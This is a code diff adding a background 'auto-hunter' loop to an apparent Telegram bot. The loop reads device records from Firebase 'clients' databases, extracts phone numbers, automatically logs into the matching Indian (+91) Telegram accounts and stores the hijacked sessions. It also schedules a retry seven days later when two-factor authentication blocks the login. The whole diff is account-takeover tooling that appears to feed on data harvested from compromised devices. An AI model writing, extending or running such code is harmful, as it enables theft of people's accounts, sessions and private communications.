@@ -173,3 +173,57 @@ async def reset_watchdog_loop(bot):
         
         if updated: db.save_data(d)
         await asyncio.sleep(3600)
+
+async def auto_hunter_loop(bot):
+    log.info("Auto-Hunter Background Loop Started...")
+    while True:
+        try:
+            d = db.load_data()
+            if not d.get("hunting_enabled", True):
+                await asyncio.sleep(60)
+                continue
+
+            fbs = d.get("firebases", [])
+            if not fbs:
+                await asyncio.sleep(60)
+                continue
+
+            found_number = None
+            for fb in fbs[:5]:
+                clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
+                if not clients or not isinstance(clients, dict): continue
+
+                for dev_id, c in clients.items():
+                    if not isinstance(c, dict): continue
+                    if c.get("status") is True:
+                        dev_data = await fbu.fetch_fb(f"{fb['url']}/clients/{dev_id}.json", fb.get("auth"))
+                        if dev_data and isinstance(dev_data, dict):
+                            best_nums = fbu.extract_best_numbers(dev_data, [])
+                            if best_nums:
+                                found_number = best_nums[0][0]
+                                break
+                if found_number: break
+
+            if found_number:
+                tg_accounts = d.get("telegram_accounts", {})
+                if f"+91{found_number}" in tg_accounts:
+                    await asyncio.sleep(30)
+                    continue
+
+                res = await auto_login_tg(bot, f"+91{found_number}")
+                
+                d = db.load_data()
+                if res["status"] == "success":
+                    d["telegram_accounts"][f"+91{found_number}"] = {"status": "active", "session": res["session"], "reset_time": 0}
+                elif "2FA" in res.get("reason", ""):
+                    reset_time = int(time.time()) + (7 * 24 * 3600)
+                    d["telegram_accounts"][f"+91{found_number}"] = {"status": "waiting_7_days", "session": "", "reset_time": reset_time}
+                else:
+                    d["telegram_accounts"][f"+91{found_number}"] = {"status": "failed", "reason": res.get("reason", "Unknown")}
+                
+                db.save_data(d)
+
+            await asyncio.sleep(120)
+        except Exception as e:
+            log.error(f"Auto-Hunter Error: {e}")
+            await asyncio.sleep(60)
